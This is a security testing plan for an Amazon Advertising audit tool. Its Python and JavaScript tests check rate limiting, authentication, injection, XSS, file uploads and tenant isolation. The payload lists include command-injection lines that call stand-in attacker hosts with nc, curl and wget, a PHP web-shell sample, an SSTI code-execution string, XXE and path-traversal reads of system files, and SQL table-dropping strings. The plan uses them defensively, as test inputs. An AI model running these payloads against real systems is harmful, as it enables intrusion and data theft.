# Security Testing Plan

## Overview
Comprehensive security testing strategy for Amazon Advertising audit tool, covering application security, infrastructure protection, and data safety.

## Security Testing Scope

### 1. Infrastructure Security

#### DDoS Protection Testing
```python
# Rate limiting test
def test_rate_limiting():
    # Attempt 100 requests in 1 second
    responses = []
    for i in range(100):
        response = requests.post(f"{API_URL}/audits")
        responses.append(response.status_code)
    
    # Should start getting 429 after limit
    assert responses.count(429) > 50
    assert "X-RateLimit-Remaining" in response.headers
```

**DDoS Mitigation Testing:**
- Verify Cloudflare/Vercel DDoS protection
- Test rate limiting per IP and per organization
- Validate request throttling:
  - 100 requests/minute per API key
  - 10 concurrent file uploads per org
  - 1000 requests/hour per IP

#### Load-Based Security Tests
```javascript
// Slowloris attack simulation
async function testSlowlorisProtection() {
  const connections = [];
  
  // Try to open many slow connections
  for (let i = 0; i < 1000; i++) {
    const conn = http.request({
      host: API_HOST,
      method: 'POST',
      path: '/api/v1/audits',
      headers: { 'Content-Length': '1000000' }
    });
    
    // Send data very slowly
    conn.write('a');
    connections.push(conn);
  }
  
  // Server should close connections
  await sleep(30000);
  const openConns = connections.filter(c => !c.destroyed).length;
  assert(openConns < 100, 'Server vulnerable to Slowloris');
}
```

### 2. Authentication & Authorization Security

#### Secret Key Management Tests
```python
def test_environment_variable_security():
    # Ensure no secrets in code
    secret_patterns = [
        r'sk_[a-zA-Z0-9]{32}',  # Clerk secret keys
        r'eyJ[a-zA-Z0-9]+',      # JWT tokens
        r'postgres://[^@]+@',    # Database URLs
        r'supabase_service_[a-zA-Z0-9]+',
    ]
    
    for pattern in secret_patterns:
        # Scan all source files
        matches = scan_codebase_for_pattern(pattern)
        assert len(matches) == 0, f"Found exposed secret: {pattern}"

def test_secret_rotation():
    # Verify secrets can be rotated without downtime
    old_key = os.environ['CLERK_SECRET_KEY']
    new_key = rotate_clerk_key()
    
    # Both keys should work during rotation period
    assert validate_with_key(old_key) == True
    assert validate_with_key(new_key) == True
```

#### JWT Security Tests
```python
def test_jwt_vulnerabilities():
    # Test algorithm confusion attack
    token = create_jwt_with_algorithm("none")
    response = api_call_with_token(token)
    assert response.status_code == 401
    
    # Test expired token
    expired_token = create_jwt(exp=time.time() - 3600)
    response = api_call_with_token(expired_token)
    assert response.status_code == 401
    
    # Test token from different organization
    other_org_token = create_jwt(org_id="org_different")
    response = access_resource(our_org_resource, other_org_token)
    assert response.status_code == 403
```

### 3. API Security Testing

#### API Key Security
```python
def test_api_key_security():
    # Test exposed API keys in responses
    response = requests.get(f"{API_URL}/audits")
    response_text = response.text
    
    assert "sk_" not in response_text  # No secret keys
    assert "supabase_service" not in response_text
    assert "PRIVATE" not in response_text
    
    # Test API key rotation
    old_key = get_current_api_key()
    new_key = rotate_api_key()
    
    # Old key should be immediately invalid
    response = api_call_with_key(old_key)
    assert response.status_code == 401
```

#### Input Validation Security
```python
def test_injection_attacks():
    # SQL Injection attempts
    sql_payloads = [
        "'; DROP TABLE audits; --",
        "1' OR '1'='1",
        "admin'--",
        "1; UPDATE users SET role='admin'",
    ]
    
    for payload in sql_payloads:
        response = create_audit(name=payload)
        assert response.status_code in [400, 422]
        assert "error" in response.json()
    
    # NoSQL Injection (for any NoSQL queries)
    nosql_payloads = [
        {"$ne": None},
        {"$gt": ""},
        {"$regex": ".*"},
    ]
    
    # Command Injection
    cmd_payloads = [
        "; cat /etc/passwd",
        "| nc attacker.com 1234",
        "`curl attacker.com`",
        "$(cat /etc/passwd)",
        "&&dir",
        "|dir",
        ";ls -la",
        "`id`",
        "| wget http://evil.com/shell.sh",
    ]
    
    # Path Traversal
    path_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    ]
    
    # LDAP Injection
    ldap_payloads = [
        "*)(uid=*",
        "admin)(&(1=1",
        "*)((mail=*",
        "*)(|(mail=*)(a=b",
    ]
    
    # XML Injection
    xml_payloads = [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<![CDATA[<script>alert('XSS')</script>]]>",
        "<!--<script>alert('XSS')</script>-->",
    ]
    
    # Template Injection
    template_payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config.items()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]
    
    # Header Injection
    header_payloads = [
        "test\r\nX-Injected: header",
        "test\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
        "test\r\nSet-Cookie: admin=true",
    ]
```

### 4. XSS (Cross-Site Scripting) Testing

#### Reflected XSS Tests
```python
def test_reflected_xss():
    xss_payloads = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        
        # Event handler XSS
        "';alert('XSS');//",
        '" onmouseover="alert(\'XSS\')" ',
        "javascript:alert('XSS')",
        
        # Encoded XSS attempts
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
        
        # Filter bypass attempts  
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        
        # Context-specific XSS
        "';alert(String.fromCharCode(88,83,83))//",
        "</script><script>alert('XSS')</script>",
        "</title><script>alert('XSS')</script>",
    ]
    
    # Test all input fields
    for payload in xss_payloads:
        # Search parameters
        response = requests.get(f"{APP_URL}/search?q={payload}")
        assert_no_xss_in_response(response, payload)
        
        # Form inputs
        response = create_audit(name=payload, client_name=payload)
        assert_no_xss_in_response(response, payload)
        
        # Headers
        response = requests.get(APP_URL, headers={"User-Agent": payload})
        assert_no_xss_in_response(response, payload)
```

#### Stored XSS Tests
```python
def test_stored_xss():
    # Test stored XSS in various fields
    stored_xss_fields = {
        "audit_name": "<script>alert('Stored XSS')</script>",
        "client_name": "<img src=x onerror=alert('XSS')>",
        "notes": "javascript:alert('XSS')",
        "recommendation_title": "<svg onload=alert(1)>",
    }
    
    for field, payload in stored_xss_fields.items():
        # Store the payload
        audit_id = create_audit(**{field: payload})
        
        # Retrieve and check output encoding
        response = get_audit(audit_id)
        assert payload not in response.text  # Should be encoded
        assert html.escape(payload) in response.text or "sanitized" in response.text
```

#### DOM-based XSS Tests
```javascript
// Frontend XSS testing
describe('DOM XSS Prevention', () => {
  test('URL parameters are sanitized', () => {
    window.location.hash = '#<img src=x onerror=alert(1)>';
    const element = document.querySelector('.hash-display');
    expect(element.innerHTML).not.toContain('<img');
    expect(element.textContent).toContain('&lt;img');
  });
  
  test('User input is properly escaped', () => {
    const userInput = '<script>alert("XSS")</script>';
    const sanitized = sanitizeInput(userInput);
    document.getElementById('output').innerHTML = sanitized;
    
    // Should not execute
    expect(window.alert).not.toHaveBeenCalled();
  });
});
```

#### Amazon Advertising Specific XSS Tests
```python
def test_amazon_specific_xss():
    # Test XSS in campaign names, ASINs, keywords
    amazon_xss_contexts = {
        "campaign_name": "<script>alert('Campaign XSS')</script>",
        "keyword": "'+alert('Keyword XSS')+'",
        "asin": "B00<script>alert(1)</script>",
        "search_term": "wireless headphones<img src=x onerror=alert('XSS')>",
        "recommendation_text": "Reduce bid by <script>alert('XSS')</script>%",
    }
    
    # Test in CSV upload
    csv_content = """
    Campaign,Keyword,Bid
    <script>alert('CSV XSS')</script>,test,1.00
    Normal Campaign,"<img src=x onerror=alert('XSS')>",2.00
    """
    
    response = upload_csv(csv_content)
    processed = get_processed_data(response.audit_id)
    
    # Verify XSS is sanitized in output
    for row in processed:
        assert "<script>" not in row
        assert "onerror=" not in row
```

### 5. File Upload Security

#### Malicious File Testing
```python
def test_file_upload_security():
    # Test file type validation
    malicious_files = [
        ("virus.exe", b"MZ\x90\x00"),  # Executable
        ("script.php", b"<?php system($_GET['cmd']); ?>"),
        ("xss.svg", b"<svg onload=alert('XSS')>"),
        ("xxe.xml", b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
        ("zip_bomb.zip", create_zip_bomb()),
    ]
    
    for filename, content in malicious_files:
        response = upload_file(filename, content)
        assert response.status_code == 400
        assert "invalid file type" in response.json()["error"]
    
    # Test file size limits
    large_file = b"A" * (501 * 1024 * 1024)  # 501MB
    response = upload_file("large.csv", large_file)
    assert response.status_code == 413
```

#### CSV Injection Testing
```python
def test_csv_injection():
    # Formula injection attempts
    csv_injections = [
        "=1+1",
        "@SUM(1+1)",
        "+1+1",
        "-1+1",
        "=cmd|'/c calc'!A1",
        "=HYPERLINK(\"http://evil.com\", \"Click me\")",
    ]
    
    for injection in csv_injections:
        csv_content = f"campaign,{injection},100\n"
        response = upload_csv(csv_content)
        
        # Should sanitize or reject
        processed_data = get_processed_data(response.audit_id)
        assert not processed_data.contains_formula()
```

### 5. Multi-Tenant Security Testing

#### Data Isolation Tests
```python
def test_organization_isolation():
    # Create data in org1
    org1_token = create_org_and_get_token("org1")
    audit1 = create_audit(org1_token, "Org1 Confidential Data")
    
    # Try to access from org2
    org2_token = create_org_and_get_token("org2")
    
    # Direct access attempt
    response = get_audit(audit1.id, org2_token)
    assert response.status_code == 403
    
    # Search/list attempt
    audits = list_audits(org2_token)
    assert audit1.id not in [a.id for a in audits]
    
    # SQL injection to bypass RLS
    response = api_call(
        "/audits?filter=organization_id='org1'", 
        org2_token
    )
    assert len(response.json()["audits"]) == 0
```

### 6. Penetration Testing Plan

#### Internal Penetration Testing (Monthly)
```bash
# Automated security scanning
#!/bin/bash

# OWASP ZAP API Scan
docker run -t owasp/zap2docker-stable zap-api-scan.py \
  -t https://api.adaudit.com/openapi.json \
  -f openapi

# Nuclei security scanning
nuclei -u https://app.adaudit.com -as

# SQLMap for injection testing
sqlmap -u "https://api.adaudit.com/audits?id=1" \
  --batch --random-agent

# Nikto web scanner
nikto -h https://app.adaudit.com
```

#### External Penetration Testing (Quarterly)
1. **Pre-MVP**: Basic security assessment
2. **Pre-Launch**: Full penetration test by security firm
3. **Quarterly**: Ongoing assessments
4. **Annually**: Comprehensive security audit

**Pen Test Scope:**
- Application security (OWASP Top 10)
- Infrastructure security
- Social engineering readiness
- Physical security (if applicable)
- Supply chain security

### 7. Security Monitoring & Incident Response

#### Real-time Security Monitoring
```python
def setup_security_monitoring():
    # Failed login attempts
    alert_on_failed_logins(threshold=5, window="5m")
    
    # Unusual data access patterns
    alert_on_bulk_downloads(threshold=100, window="1h")
    
    # Geographic anomalies
    alert_on_new_country_access()
    
    # Privilege escalation attempts
    alert_on_role_changes()
    
    # File upload anomalies
    alert_on_suspicious_files()
```

#### Security Headers Testing
```python
def test_security_headers():
    response = requests.get(APP_URL)
    headers = response.headers
    
    # Required security headers
    assert headers.get("Strict-Transport-Security") == "max-age=31536000; includeSubDomains"
    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") == "DENY"
    assert headers.get("X-XSS-Protection") == "1; mode=block"
    assert "Content-Security-Policy" in headers
    assert headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
```

### 8. Compliance & Audit Testing

#### GDPR Compliance Tests
```python
def test_gdpr_compliance():
    # Right to access
    user_data = request_user_data(user_id)
    assert user_data.contains_all_personal_data()
    
    # Right to deletion
    delete_response = delete_user_data(user_id)
    assert delete_response.status_code == 200
    
    # Verify deletion
    verify_response = get_user_data(user_id)
    assert verify_response.status_code == 404
    
    # Data portability
    export = export_user_data(user_id)
    assert export.format == "json"
    assert export.is_machine_readable()
```

### 9. Security Test Automation

#### CI/CD Security Pipeline
```yaml
name: Security Tests
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - name: Secret Scanning
        uses: trufflesecurity/trufflehog@main
        
      - name: Dependency Scanning
        run: |
          npm audit
          pip-audit
          
      - name: SAST Scanning
        uses: github/super-linter@v4
        
      - name: Container Scanning
        run: |
          trivy image app:latest
          
      - name: DAST Testing
        run: |
          python security_tests.py
```

### 10. Security Testing Schedule

#### Continuous (Every Commit)
- Secret scanning
- Dependency vulnerability scanning
- Static code analysis

#### Daily
- Authentication security tests
- API security validation
- Rate limiting verification

#### Weekly
- Full OWASP Top 10 test suite
- Penetration testing (automated)
- Security header validation

#### Monthly
- Manual penetration testing
- Social engineering assessment
- Security training validation

#### Quarterly
- External penetration test
- Compliance audit
- Incident response drill

---

## Security Testing Checklist

### Application Security
- [ ] Input validation for all user inputs
- [ ] Output encoding to prevent XSS
- [ ] Parameterized queries to prevent SQL injection
- [ ] Secure session management
- [ ] Strong authentication mechanisms
- [ ] Proper authorization checks
- [ ] Secure file upload handling
- [ ] Error handling without information disclosure

### Infrastructure Security
- [ ] DDoS protection configured
- [ ] Rate limiting implemented
- [ ] WAF rules configured
- [ ] TLS 1.3 enforced
- [ ] Security headers implemented
- [ ] CORS properly configured
- [ ] Secrets management secure
- [ ] Logging and monitoring active

### Data Security
- [ ] Encryption at rest
- [ ] Encryption in transit
- [ ] PII handling compliance
- [ ] Data retention policies
- [ ] Backup security
- [ ] Multi-tenant isolation
- [ ] Audit logging
- [ ] GDPR compliance

---
*Security testing should be performed by both QA and dedicated security professionals. Consider engaging external security firms for comprehensive assessments.*